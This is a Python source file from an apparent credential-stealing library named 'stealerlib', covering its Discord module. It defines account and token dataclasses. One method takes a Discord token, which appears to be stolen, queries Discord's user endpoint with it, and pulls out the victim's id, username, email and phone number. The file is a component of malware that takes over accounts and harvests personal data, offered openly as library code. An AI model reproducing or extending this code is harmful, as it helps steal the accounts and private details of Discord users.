# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/apps/discord/types.py
"""

from stealerlib.apps.discord import *


class DiscordTypes:

    @dataclass
    class Account:
        id: str
        token: str
        username: str
        discriminator: str
        email: str
        phone: str

        def conv(self) -> list:
            return [
                self.id,
                self.token,
                self.username,
                self.discriminator,
                self.email,
                self.phone
            ]

    @dataclass
    class Token:
        token: str

        def get_information(self):
            r = requests.get(
                "https://discord.com/api/v9/users/@me",
                headers={'Authorization': self.token}
            )

            if r.status_code == 200:
                obj_r = r.json()
                id = obj_r['id']
                username = obj_r['username']
                email = obj_r['email']
                discriminator = obj_r['discriminator']
                phone_number = obj_r['phone']
            else:
                id = None
                username = None
                email = None
                discriminator = None
                phone_number = None

            new_account = DiscordTypes.Account(
                id=id,
                token=self.token,
                username=username,
                discriminator=discriminator,
                email=email,
                phone=phone_number,
            )

            return new_account
